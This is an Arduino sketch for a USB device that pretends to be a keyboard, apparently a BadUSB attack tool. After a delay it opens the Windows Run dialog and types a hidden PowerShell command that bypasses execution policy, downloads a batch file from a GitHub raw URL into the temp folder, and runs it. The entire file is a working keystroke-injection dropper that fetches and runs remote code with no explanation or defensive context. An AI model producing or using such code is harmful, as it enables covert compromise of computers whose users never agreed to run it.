#include <HIDKeyboard.h>
HIDKeyboard keyboard;

void setup() {
  // Initialize the keyboard
  keyboard.begin();
  delay(2000);

  // Open the Run dialog
  keyboard.pressSpecialKey(GUI);  // Press Windows key
  delay(200);
  keyboard.println("run");
  keyboard.pressSpecialKey(ENTER);  // Press Enter key
  keyboard.releaseKey();
  delay(1000);

  // Type the PowerShell command
  keyboard.println("powershell -NoP -NonI -W Hidden -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rogue4z/nothing/refs/heads/main/hehe.txt',`\"$env:temp\\memes.bat`\" ); Start-Process `\"$env:temp\\memes.bat`\"\"");
  keyboard.pressSpecialKey(ENTER);  // Press Enter to execute the command
  keyboard.releaseKey();
}

void loop() {
  // Nothing to do in the loop
}
